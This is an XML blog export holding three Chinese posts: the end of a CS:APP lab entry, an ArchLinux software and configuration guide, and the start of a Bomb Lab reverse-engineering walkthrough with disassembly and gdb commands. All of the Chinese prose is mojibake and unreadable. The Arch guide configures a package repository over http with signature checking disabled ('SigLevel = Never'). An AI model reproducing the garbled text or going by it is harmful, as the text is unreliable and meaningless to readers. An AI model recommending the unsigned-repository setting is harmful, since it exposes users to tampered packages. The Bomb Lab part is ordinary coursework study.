è¿™æ¬¡å®žéªŒåŠ å¼ºäº†æˆ‘å¯¹äºŽå‡½æ•°è°ƒç”¨æ ˆï¼Œå­—èŠ‚åºï¼Œgdbä½¿ç”¨ï¼Œæ±‡ç¼–çš„ç†è§£ã€‚]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArchLinuxä½ å¯èƒ½éœ€è¦çŸ¥é“çš„æ“ä½œä¸Žè½¯ä»¶åŒ…æŽ¨èã€ŒæŒç»­æ›´æ–°ã€]]></title>
    <url>%2F2017%2F07%2F02%2Farch_more%2F</url>
    <content type="text"><![CDATA[ä½ å¯èƒ½éœ€è¦çŸ¥é“çš„æ“ä½œä¸Žè½¯ä»¶åŒ…æŽ¨èåœ¨ç¬¬ä¸€ç¯‡æ•™ç¨‹ä¸­ä»‹ç»äº†ArchLinuxçš„åŸºæœ¬å®‰è£…ï¼Œç¬¬äºŒç¯‡æ•™ç¨‹ä¸­ä»‹ç»äº†å¿…é¡»çš„è®¾ç½®ä¸Žå›¾å½¢ç•Œé¢çš„å®‰è£…ï¼Œè¿™ç¯‡æ–‡ç« å¹¶ä¸æ˜¯æ•™ç¨‹ï¼Œåªæ˜¯æŽ¨èä¸€äº›è‡ªå·±æ—¥å¸¸ä½¿ç”¨çš„æ“ä½œä¸Žè½¯ä»¶åŒ…ã€‚å†™è¿™ç¯‡æ–‡ç« æ—¶æ²¡æœ‰é‡æ–°å®‰è£…ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰è¯¦ç»†çš„è¿‡ç¨‹ï¼Œåªæ˜¯ç®€å•åœ°åˆ—ä¸¾åº”è¯¥è£…çš„è½¯ä»¶åŒ…æˆ–è€…æ˜¯åŸºç¡€çš„é…ç½®ï¼Œæ›´åŠ ç»†èŠ‚çš„å†…å®¹è¯·æŸ¥é˜…ç›¸å…³wikiã€‚ å®‰è£…Yaourtåœ¨ä¹‹å‰æˆ‘ä»¬ç®¡ç†è½¯ä»¶åŒ…éƒ½æ˜¯ä½¿ç”¨å®˜æ–¹ä¸ºæˆ‘ä»¬æä¾›çš„pacmanï¼Œè½¯ä»¶åŒ…çš„æ¥æºéƒ½æ˜¯å®˜æ–¹ã€‚ä½†æ˜¯Archæ‹¥æœ‰ä¸€ä¸ªå¼ºå¤§çš„ç”¨æˆ·åº“AURå³Arch User Repositoryï¼Œä¸ºæˆ‘ä»¬æä¾›äº†å®˜æ–¹åŒ…ä¹‹å¤–çš„å„ç§è½¯ä»¶åŒ…ï¼Œä¸€äº›é—­æºçš„è½¯ä»¶åŒ…ä¹Ÿå¯ä»¥åœ¨ä¸Šé¢æ‰¾åˆ°ï¼Œå¯ä»¥è¯´AURæžå¤§åœ°ä¸°å¯Œäº†è½¯ä»¶åŒ…çš„ç§ç±»ä¸Žæ•°é‡ï¼Œå¹¶å¯ä»¥é…åˆyaourtè¿™æ ·çš„å·¥å…·ä¸ºç”¨æˆ·çœä¸‹å¤§é‡å®‰è£…ã€æ›´æ–°è½¯ä»¶åŒ…çš„æ—¶é—´ã€‚ yaourtå®žé™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯å¯¹pacmançš„åŒ…è£…ï¼Œå®ƒå…¼å®¹pacmançš„æ‰€æœ‰æ“ä½œï¼Œæœ€å¤§çš„ä¸åŒæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ–¹ä¾¿åœ°å®‰è£…ä¸Žç®¡ç†AURä¸­çš„åŒ…ï¼Œä¸‹é¢çš„è®¸å¤šè½¯ä»¶åŒ…éƒ½æ˜¯åœ¨AURåº“ä¸­çš„ï¼Œä¹Ÿéƒ½æ˜¯ä½¿ç”¨AURæ¥å®‰è£…çš„ã€‚ å®‰è£…yaourtä»¥rootæƒé™æ‰“å¼€ç¼–è¯‘/etc/pacman.confï¼Œå°†ä¸‹é¢è¿™ä¸‰è¡ŒåŠ å…¥åˆ°æ–‡ä»¶æœ«å°¾å¹¶ä¿å­˜ï¼š 123[archlinuxcn]SigLevel = NeverServer = http://repo.archlinuxcn.org/$arch åŒæ­¥è½¯ä»¶ä¿¡æ¯åº“å¹¶å®‰è£…yaourtï¼š 1sudo pacman -Sy yaourt fakeroot yaourtä½¿ç”¨è¯·è§ https://www.linuxdashen.com/arch-linux%E4%BD%BF%E7%94%A8yaourt%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%BD%BB%E6%9D%BE%E5%AE%89%E8%A3%85aur%E8%BD%AF%E4%BB%B6%E5%8C%85 æ»šåŠ¨æ›´æ–°ArchLinuxçš„æ›´æ–°æœºåˆ¶æ˜¯éžå¸¸æ¿€è¿›çš„æ»šåŠ¨æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è¯´ArchLinuxçš„è½¯ä»¶ä¸Žå†…æ ¸ä¼šæ—¶åˆ»ä¸Žç¨³å®šç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œä½ æ‰€ç”¨çš„ç³»ç»Ÿæ€»æ˜¯æ—¶åˆ»ä¿æŒæœ€æ–°çš„ã€‚ è¿™ä¸ªæœºåˆ¶ç»™å¾ˆå¤šArchæ•™å¾’å¸¦æ¥äº†å¼ºå¤§çš„å¿«æ„Ÿï¼Œå¯ä»¥ç¬¬ä¸€æ—¶é—´ä½“éªŒåˆ°æ–°çš„è½¯ä»¶ä¸Žæ–° çš„å†…æ ¸ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨ç€æ—¥å¸¸æ»šç‚¸è¿™æ ·çš„é—®é¢˜ã€‚è™½ç„¶æ»šåŠ¨æ›´æ–°çš„åŒ…å¯èƒ½å› ä¸ºæ²¡æœ‰ç»è¿‡å®Œå–„çš„æµ‹è¯•ä¼šå¯¼è‡´ç³»ç»Ÿä¸èƒ½å·¥ä½œç§ç§é—®é¢˜ï¼Œä½†æ˜¯ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹çš„æ›´æ–°éƒ½ä¸ä¼šå¯¼è‡´å¤ªå¤§çš„é—®é¢˜ã€‚ä¿®å¤æ»šç‚¸çš„ç³»ç»Ÿå’Œæäº¤Bugä¿¡æ¯ä¹Ÿæ˜¯ArchLinuxç”¨æˆ·çš„æŠ€èƒ½ä¹‹ä¸€ã€‚ æ»šåŠ¨æ›´æ–°å‘½ä»¤ä½¿ç”¨yaourtéžå¸¸ç®€å•ï¼š 1yaourt -Syu --aur --aurå‚æ•°æ˜¯æ£€æŸ¥å¹¶æ›´æ–°AURåŒ…ä¸­çš„å†…å®¹ã€‚ shadowsockså›¾å½¢ç‰ˆæœ¬2017.10.11 æ›´æ–°ï¼šç›®å‰çš„qt5å®¢æˆ·ç«¯å¯èƒ½æœ‰å¤±æ•ˆçš„é—®é¢˜ï¼Œè¯·ä½¿ç”¨shadowsocksåŒ…æä¾›çš„å‘½ä»¤è¡Œç‰ˆæœ¬ å®‰è£…å®˜æ–¹æºä¸­çš„shadowsocks-qt5åŒ…ï¼Œè‡ªå¸¦å›¾å½¢ç•Œé¢ï¼Œé€šè¿‡è½¯ä»¶èœå•ï¼ˆæ¡Œé¢çŽ¯å¢ƒè‡ªå¸¦ï¼‰å¯åŠ¨å³å¯ã€‚ å‘½ä»¤è¡Œç‰ˆæœ¬å®‰è£…å®˜æ–¹æºä¸­çš„shadowsocksåŒ…ï¼Œç¼–è¾‘/etc/example.jsonæ–‡ä»¶ï¼ŒæŒ‰ç¤ºä¾‹å¡«å†™ï¼š 12345678910&#123; "server":"my_server_ip", "server_port":8388, "local_address": "127.0.0.1", "local_port":1080, "password":"mypassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; serverï¼šæœåŠ¡å™¨åœ°å€ server_portï¼šæœåŠ¡å™¨ç«¯å£ ä¸‹é¢ä¸¤è¡Œåˆ†åˆ«æ˜¯æœ¬åœ°åœ°å€å’Œæœ¬åœ°ç«¯å£ passwordï¼šå¯†ç  methodï¼šåŠ å¯†æ–¹å¼ ç„¶åŽä»¥ç³»ç»ŸæœåŠ¡æ–¹å¼å¯åŠ¨ï¼š 1sudo systemctl start shadowsocks@example.service å¦‚éœ€å¼€æœºå¯åŠ¨ï¼š 1sudo systemctl enable shadowsocks@example.service Chromeä»£ç†éœ€å…ˆé…ç½®å¥½æœ¬åœ°shadowsocksä»£ç† å®‰è£…å®˜æ–¹æºä¸­å¼€æºçš„chromiumæˆ–è€…AURä¸­çš„google-chromeéƒ½å¯ä»¥ï¼Œä¸‹é¢ä»¥google-chromeä¸ºä¾‹ã€‚ å…ˆç”¨å‘½ä»¤è¡Œä»£ç†å¯åŠ¨chromeï¼š 1google-chrome-stable --proxy-server="socks5://127.0.0.1:1080" chromiumæ¢ä¸‹å‘½ä»¤å°±å¯ä»¥ã€‚ ç„¶åŽå®‰è£…SwitchyOmegaè¿™ä¸ªæ’ä»¶ï¼Œé…ç½®å¥½GFWListå’Œä»£ç†è§„åˆ™å°±å¯ä»¥è‡ªåŠ¨ä»£ç†äº†ã€‚ä¹‹åŽçš„å¯åŠ¨å°±ä¸éœ€è¦å‘½ä»¤è¡Œäº†ã€‚ å‘½ä»¤è¡Œä»£ç†éœ€å…ˆé…ç½®å¥½æœ¬åœ°shadowsocksä»£ç† æŽ¨èä½¿ç”¨proxychains-ngåŒ…è¿›è¡Œå‘½ä»¤è¡Œä»£ç†ï¼š å®‰è£…proxychains-ngåŒ…åŽç¼–è¾‘/etc/proxychains.confæ–‡ä»¶ï¼ˆéœ€rootæƒé™ï¼‰ åˆ°æ–‡ä»¶æœ«å°¾æ‰¾åˆ°ProxyListé¡¹ï¼ŒæŒ‰ç¤ºä¾‹æ·»åŠ æœ¬åœ°ä»£ç†ï¼š å›¾ä¸ºæˆ‘çš„socks5é…ç½®ï¼Œä¿å­˜åŽé€€å‡ºã€‚ ä¹‹åŽéœ€è¦ç”¨ä»£ç†è¿è¡Œçš„å‘½ä»¤éƒ½å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤å‰åŠ ä¸Šproxychainsæ¥ä½¿ç”¨ä»£ç†è¿è¡Œã€‚ ä¸­æ–‡å­—ä½“ä¸Žä¸­æ–‡è¾“å…¥æ³•ä¸­æ–‡å­—ä½“æŽ¨èå®‰è£…å®˜æ–¹æºä¸­noto-fonts-cjkï¼Œä¸­æ–‡è¾“å…¥æ³•éœ€è¦å®‰è£…fcitxåŒ…ä¸Žfcitx-imé›†åˆåŒ…ï¼Œå†åŠ ä¸Šä¸€ä¸ªä¸­æ–‡æ”¯æŒåŒ…ï¼Œå¯ä»¥åˆ°https://wiki.archlinux.org/index.php/fcitx#Chineseä¸­æŒ‘é€‰ä¸€ä¸ªå–œæ¬¢çš„åŒ…è£…ä¸Šã€‚ è£…å®Œä»¥åŽéœ€è¦ä¿®æ”¹/etc/profileæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¼€å¤´åŠ å…¥ä¸‰è¡Œï¼š 123export XMODIFIERS="@im=fcitx"export GTK_IM_MODULE="fcitx"export QT_IM_MODULE="fcitx" å¯ä»¥è§£å†³ä¸€äº›è½¯ä»¶æ— æ³•è°ƒå‡ºfcitxçš„é—®é¢˜ã€‚ zshzshæ˜¯é»˜è®¤shell bashçš„æ›¿ä»£å“ä¹‹ä¸€ï¼Œå®ƒçš„ç‰¹ç‚¹æ˜¯æ’ä»¶å¤šé…ç½®æ–¹ä¾¿ï¼Œå…¼å®¹bashè„šæœ¬å¹¶ä¸”æ”¯æŒæ›´å¼ºå¤§çš„é«˜äº®ä¸Žè¡¥å…¨ã€‚ å®‰è£…å®˜æ–¹æºä¸­zshåŒ…ã€‚ è®¾ç½®zshä¸ºé»˜è®¤shellï¼š 1sudo chsh -s /bin/zsh username æŽ¨èå®‰è£…AURä¸­çš„oh-my-zsh-gitè¿™ä¸ªåŒ…ï¼Œå¯ä»¥å¸®åŠ©é…ç½®ä¸€äº›å®žç”¨çš„åŠŸèƒ½ã€‚ å…¶ä»–ä¸»é¢˜æ’ä»¶é…ç½®è¯·è§oh-my-zshçš„é…ç½®ä»‹ç»ï¼Œåˆ†äº«ä¸€ä¸‹æˆ‘å®‰è£…çš„æ’ä»¶ï¼š 1plugins=(vim git sudo extract z wd archlinux zsh-autosuggestions zsh-syntax-highlighting) æ³¨æ„åŽé¢ä¸¤ä¸ªæ’ä»¶éœ€è¦å®‰è£…ç›¸åº”çš„æ”¯æŒåŒ…å¹¶é…ç½®æ‰èƒ½ä½¿ç”¨ã€‚ SynapseSynapseæ˜¯ä¸€ä¸ªå¿«é€Ÿçš„è½¯ä»¶å¯åŠ¨å™¨ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æŸ¥æ‰¾å®‰è£…çš„è½¯ä»¶ï¼Œè®¾ç½®å¿«æ·é”®ä½¿ç”¨å†ä¹Ÿä¸ç”¨æ‰¾è½¯ä»¶å…¥å£äº†ã€‚ å®‰è£…å®˜æ–¹æºä¸­çš„synapseåŒ…ã€‚ YakuakeYakuakeæ˜¯ä¸€ä¸ªç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œæˆ‘ä½¿ç”¨å®ƒçš„åŽŸå› æ˜¯å®ƒæ”¯æŒä¸‹æ‹‰ï¼Œé…åˆå¿«æ·é”®ä½¿ç”¨éžå¸¸æ–¹ä¾¿ï¼š å®‰è£…å®˜æ–¹æºä¸­çš„yakuakeåŒ…ã€‚ è™šæ‹Ÿæœºæœ‰äº›æ—¶å€™éœ€è¦ä½¿ç”¨windowsè€Œä¸æƒ³åˆ‡æ¢ç³»ç»Ÿæˆ–å¹²è„†æ²¡æœ‰windowsçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨windowsè™šæ‹Ÿæœºæ¥ä»£æ›¿ã€‚å½“ç„¶è™šæ‹Ÿæœºçš„ç”¨å¤„ä¸æ­¢äºŽæ­¤ã€‚ Archä¸‹çš„è™šæ‹Ÿæœºé¦–å…ˆå¼€æºçš„VirtualBoxï¼Œå®‰è£…å®˜æ–¹æºçš„virtualbox virtualbox-ext-vnc virtualbox-guest-iso virtualbox-host-modules-archè¿™å‡ ä¸ªåŒ…ã€‚ å†åŽ»å®˜ç½‘ä¸‹è½½Oracle VM VirtualBox Extension Pack ï¼Œåœ¨è®¾ç½®ä¸­å¯¼å…¥ä½¿ç”¨ã€‚å®‰è£…windowsçš„è¿‡ç¨‹ä¸åœ¨è¿™é‡Œè®²è§£ï¼Œè®°å¾—å®‰è£…ä¹‹åŽåœ¨windowså†…å®‰è£…æ‰©å±•å®¢æˆ·ç«¯è½¯ä»¶å³å¯ã€‚]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆCS:APP) - Bomb Labè¯¦è§£]]></title>
    <url>%2F2017%2F06%2F21%2FCS_APP_BombLab%2F</url>
    <content type="text"><![CDATA[Bomb Labå®žéªŒä»£ç è§GitHub ç®€ä»‹BombLabæ˜¯CS:APPä¸­å¯¹åº”ç¬¬ä¸‰ç« å†…å®¹ï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤ºçš„labã€‚ä¸»è¦å†…å®¹ä¸ºæä¾›ä¸€ä¸ªäºŒè¿›åˆ¶å¯¹è±¡æ–‡ä»¶bombï¼Œå½“è¿è¡Œæ—¶ï¼Œå®ƒä¼šè¦æ±‚ç”¨æˆ·è¾“å…¥å…­ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æžœå…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸æ­£ç¡®ï¼Œç‚¸å¼¹å°±ä¼šçˆ†ç‚¸ï¼Œè¾“å‡ºä¸€è¡Œé”™è¯¯ä¿¡æ¯å¹¶å‘è®¡åˆ†æœåŠ¡å™¨æäº¤ï¼ˆè‡ªå­¦æ‰€ç”¨çš„ææ–™ä¸ä¼šå‘æœåŠ¡å™¨æäº¤ä¿¡æ¯ï¼Œä½†è¿™ä¸ä»£è¡¨æˆ‘ä»¬å¯ä»¥éšæ„è®©ç‚¸å¼¹çˆ†ç‚¸ï¼‰ï¼Œå­¦ç”Ÿå¿…é¡»é€šè¿‡åæ±‡ç¼–å’Œé€†å‘å·¥ç¨‹æ¥æ‰¾åˆ°å…­ä¸ªæ­£ç¡®çš„å­—ç¬¦ä¸²æ¥è§£é™¤è‡ªå·±çš„ç‚¸å¼¹ï¼ˆç†è®ºä¸Šæ¯ä¸ªäººçš„ç‚¸å¼¹ç­”æ¡ˆéƒ½ä¸åŒï¼Œä½†è‡ªå­¦ææ–™çš„ç­”æ¡ˆéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ¬æ–‡é’ˆå¯¹çš„æ˜¯è‡ªå­¦ææ–™ï¼‰ã€‚ æ‰€ç”¨å·¥å…·objdump-ç”¨äºŽåæ±‡ç¼–äºŒè¿›åˆ¶å¯¹è±¡æ–‡ä»¶ VS Code-ç”¨äºŽæŸ¥çœ‹åæ±‡ç¼–åŽçš„ç»“æžœä¸Žæ–‡æœ¬æ–‡ä»¶çš„ç¼–å†™ gdb-ç”¨äºŽè¿è¡Œæ—¶å•æ­¥è°ƒè¯•ä¸ŽæŸ¥çœ‹è¿è¡Œæ—¶å†…å­˜ä¸Žå¯„å­˜å™¨ä¿¡æ¯ è§£é¢˜è¿‡ç¨‹å‰æœŸç”±äºŽä¹‹å‰æ²¡æœ‰æŽ¥è§¦è¿‡ç±»ä¼¼çš„é€†å‘å·¥ç¨‹é—®é¢˜ï¼Œæ‹¿åˆ°é—®é¢˜ä»¥åŽç¬¬ä¸€æ—¶é—´å¾ˆéš¾é©¬ä¸Šå¼€å§‹è§£å†³ã€‚æ‰€ä»¥å…ˆæŸ¥çœ‹æˆ‘ä»¬èƒ½çœ‹åˆ°çš„æ–‡ä»¶ä¿¡æ¯ã€‚ ç›®å½•ä¸­æä¾›äº†ä¸€ä¸ªbomb.cæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ååˆ†ç®€å•ï¼Œæœ‰ä¸€ä»½éžå¸¸æœ‰è¶£çš„LISENCE: /* * Dr. Evilâ€™s Insidious Bomb, Version 1.1 * Copyright 2011, Dr. Evil Incorporated. All rights reserved. * * LICENSE: * * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the * VICTIM) explicit permission to use this bomb (the BOMB). This is a * time limited license, which expires on the death of the VICTIM. * The PERPETRATOR takes no responsibility for damage, frustration, * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other * harm to the VICTIM. Unless the PERPETRATOR wants to take credit, * that is. The VICTIM may not distribute this bomb source code to * any enemies of the PERPETRATOR. No VICTIM may debug, * reverse-engineer, run â€œstringsâ€ on, decompile, decrypt, or use any * other technique to gain knowledge of and defuse the BOMB. BOMB * proof clothing may not be worn when handling this program. The * PERPETRATOR will not apologize for the PERPETRATORâ€™s poor sense of * humor. This license is null and void where the BOMB is prohibited * by law. */ æŽ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ˜¯mainå‡½æ•°ï¼Œä»Žä¸»å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•´ä¸ªç¨‹åºçš„ç»“æž„ä¸Žè¾“å…¥æ–¹å¼ï¼šå¯ä»¥ä»Žæ ‡å‡†è¾“å…¥æˆ–æ–‡ä»¶ä¸­è¯»å–ï¼Œä¸€è¡Œä½œä¸ºä¸€é¢˜çš„è§£ï¼Œè§£å‡ºä¸€ä¸ªé—®é¢˜ä»¥åŽå¯ä»¥è¿›å…¥ä¸‹ä¸€ä¸ªé—®é¢˜ï¼Œæ³¨æ„åˆ°è¿”å›žå‰çš„ä¸€æ®µæ³¨é‡Šï¼š â€‹ /* Wow, they got it! But isnâ€™t somethingâ€¦ missing? Perhaps â€‹ * something they overlooked? Mua ha ha ha ha! */ æš—ç¤ºäº†æˆ‘ä»¬éšè—é—®é¢˜çš„å­˜åœ¨ï¼Œé™¤æ­¤ä¹‹å¤–å†ä¹Ÿæ²¡æœ‰ä»»ä½•å…³äºŽè¿™ä¸ªç‚¸å¼¹çš„ä¿¡æ¯ã€‚ ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨objdumpå‘½ä»¤å°†ç‚¸å¼¹æ–‡ä»¶åæ±‡ç¼–å‡ºæ¥ï¼š 1objdump -d bomb &gt; bomb.asm ç„¶åŽé€šè¿‡VS Codeæ¥æŸ¥çœ‹åæ±‡ç¼–çš„ç»“æžœï¼ŒVS Codeæœ‰x86 and x86_64 Assemblyè¿™ä¸ªæ’ä»¶å¯ä»¥é«˜äº®æ±‡ç¼–ï¼Œçœ‹èµ·æ¥ä¼šèˆ’æœè®¸å¤šã€‚ åæ±‡ç¼–å‡ºæ¥çš„ä»£ç æœ‰è¿‘å…­åƒè¡Œï¼Œä½†æ˜¯å› ä¸ºæœ‰ç¬¦å·è¡¨çš„å­˜åœ¨ï¼Œè¯´æ˜Žä¿ç•™äº†è°ƒè¯•æ‰€éœ€çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡gdbè¿›è¡Œå•æ­¥è°ƒè¯•æ¥æŸ¥çœ‹ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ã€‚ åœ¨ä½¿ç”¨gdb çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸Š-tuiå‘½ä»¤å¹¶ç”¨layout asmå‘½ä»¤åˆ‡æ¢åˆ°æ±‡ç¼–æŒ‡ä»¤æ¨¡å¼ï¼Œå°±å¯ä»¥åœ¨è°ƒè¯•çš„æ—¶å€™æŸ¥çœ‹å¯¹åº”çš„æ±‡ç¼–ä»£ç äº†ã€‚ç•Œé¢å¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°åœ°å€0x400da0å°±æ˜¯mainå‡½æ•°çš„åœ°å€ã€‚ ä¸€ç›´å‘ä¸‹æŸ¥çœ‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°Cæ–‡ä»¶ä¸­å‡ºçŽ°çš„initialize_bombå‡½æ•°ï¼Œç„¶åŽå°±åˆ°äº†phase_1å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹è¿™ä¸ªå‡½æ•°å°±æ˜¯åˆ¤æ–­æ˜¯å¦é€šè¿‡çš„æ ¸å¿ƒå‡½æ•°ã€‚ è¿™æ—¶å€™å°±è¦ç”¨åˆ°gdbçš„æŒ‡ä»¤äº†ï¼Œåœ¨æ±‡ç¼–æ¨¡å¼ä¸‹çš„æŒ‡ä»¤ä¸Žæ™®é€šæ¨¡å¼æœ‰ä¸€äº›ä¸åŒã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ni(next instruction)å’Œsi(step into)æ¥å®žçŽ°æ™®é€šæ¨¡å¼ä¸‹çš„å•æ­¥å‘ä¸‹æ‰§è¡Œä¸Žæ­¥å…¥æ“ä½œã€‚ æ‰“æ–­ç‚¹éœ€è¦ä½¿ç”¨b &lt;func_name&gt;æˆ–b *&lt;address&gt;æ¥è¿›è¡Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è°ƒç”¨phase_1å‡½æ•°çš„callæŒ‡ä»¤çš„åœ°å€æ˜¯0x400e3aï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨b phase_1æˆ–b *0x400e3aæ¥æ‰“æ–­ç‚¹çš„ï¼Œè¿™ä¸¤æ¡å‘½ä»¤æœ‰ä¸€ç‚¹ä¸åŒå°±åœ¨äºŽæ–­åœ¨åœ°å€ä¼šåœåœ¨åœ°å€ ä¸Šä¹Ÿå°±æ˜¯callæŒ‡ä»¤çš„ä½ç½®ï¼Œæ–­åœ¨å‡½æ•°åä¼šè¿›å…¥å‡½æ•°ä¸­ï¼Œç›¸å½“äºŽå†è¿›è¡Œäº†ä¸€æ¬¡siæ“ä½œã€‚ æ–­ç‚¹åœåŽæœ‰å¯èƒ½å‡ºçŽ°å­—ç¬¦é‡å çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨refreshå‘½ä»¤åˆ·æ–°ç•Œé¢ã€‚ ä¸‹é¢æŠŠæ–­ç‚¹æ‰“åœ¨phase_1å‡½æ•°ä¹‹åŽå°±å¯ä»¥ä½¿ç”¨rå‘½ä»¤æ¥è¿è¡ŒæŒ‡ä»¤äº†ï¼Œç¨‹åºä¼šæç¤ºæˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ—¶å€™å› ä¸ºæˆ‘ä»¬æ‰“äº†æ–­ç‚¹ä¸ç”¨æ‹…å¿ƒç‚¸å¼¹ä¼šçˆ†ç‚¸ï¼Œå¯ä»¥éšæ„è¾“å…¥ã€‚æ‰§è¡ŒåŽç¨‹åºä¼šåœåœ¨phase_1å‡½æ•°çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡½æ•°å†…éƒ¨çš„æƒ…å†µã€‚ ä¸‹é¢å°±å¯ä»¥æ ¹æ®å‡½æ•°å†…éƒ¨çš„é€»è¾‘æ¥è§£å†³ç‚¸å¼¹äº†ã€‚ ä»£ç æ¥è‡ªobjdump -dåæ±‡ç¼–å‡ºæ¥çš„ä»£ç ï¼Œä¸Žgdbçš„æ±‡ç¼–æ¨¡å¼ä¸‹çœ‹åˆ°çš„ä»£ç æ˜¯ä¸€æ ·çš„ã€‚ ä¸»å‡½æ•°ä¸»å‡½æ•°ä»£ç æ¯”è¾ƒé•¿ï¼Œåªè´´æˆ‘ä»¬éœ€è¦åˆ†æžçš„å…³é”®éƒ¨åˆ†ã€‚ 12400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi ç¬¬ä¸€å¥è°ƒç”¨äº†read_lineå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è½¬åˆ°å‡½æ•°å…¥å£åœ°å€40149eåŽ»æŸ¥çœ‹read_lineçš„ä»£ç ï¼ˆäº‹å®žä¸Šä¸€å¼€å§‹æˆ‘ä¹Ÿè¿™ä¹ˆåšäº†ï¼‰ï¼Œä½†æ˜¯ä¼šå‘çŽ°ä»£ç ä¸­åŒ…å«äº†è®¸å¤šå¯¹ç³»ç»Ÿåº“å‡½æ•°çš„è°ƒç”¨ï¼Œä»”ç»†åˆ†æžçš„éš¾åº¦æ¯”è¾ƒå¤§å¹¶ä¸”æ²¡æœ‰å¿…è¦ã€‚ä»Žæä¾›çš„Cä»£ç ä¸Žå‡½æ•°åç§°ï¼Œæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹å‡ºè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯è¯»å–ä¸€è¡Œè¾“å…¥ã€‚æ ¹æ®è¿”å›žå€¼ä¸€èˆ¬å­˜æ”¾åœ¨raxä¸­çš„çº¦å®šï¼Œraxä¸­åº”è¯¥å°±æ˜¯è¯»å…¥çš„æ•°æ®çš„åœ°å€ï¼Œç¬¬äºŒå¥ä¸­æˆ‘ä»¬æŠŠè¿™ä¸ªå€¼å¤åˆ¶åˆ°äº†rdiä¸­ã€‚ 12400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; æŽ¥ä¸‹æ¥ä¸¤å¥åˆ†åˆ«å¼€å§‹è°ƒç”¨phase_1ä¸Žphase_defusedï¼Œä¸‹é¢çš„äº”ä¸ªé˜¶æ®µä¹Ÿæ˜¯ä¸Šé¢è¿™æ ·çš„æ¨¡å¼ã€‚ é˜¶æ®µä¸€1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq é˜¶æ®µä¸€çš„ä»£ç æ¯”è¾ƒçŸ­ï¼Œç¬¬äºŒè¡Œä¸­æŠŠä¸€ä¸ªåœ°å€ç»™äº†esiï¼ŒæŽ¥ä¸‹æ¥è°ƒç”¨äº†strings_not_equalè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è·³åˆ°å‡½æ•°å…¥å£åœ°å€æŸ¥çœ‹è¿™ä¸ªå‡½æ•°ã€‚ 12340133c: 48 89 fb mov %rdi,%rbx40133f: 48 89 f5 mov %rsi,%rbp401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; å‡½æ•°ä¸­è¿™ä¸¤è¡Œåˆ†åˆ«æŠŠrdi rsiçš„å€¼å¤åˆ¶åˆ°äº†rbxä¸Žrbpï¼Œç„¶åŽè°ƒç”¨äº†string_lengthï¼Œè¿™ä¸ªæ—¶å€™å°±ä¸ç”¨åŽ»çœ‹string_lengthå‡½æ•°äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥çŒœæµ‹å‡ºrbxä¸Žrbpå°±æ˜¯å‡½æ•°çš„å‚æ•°ã€‚é‚£ä¹ˆå¯ä»¥è¯´æ˜Žrdi 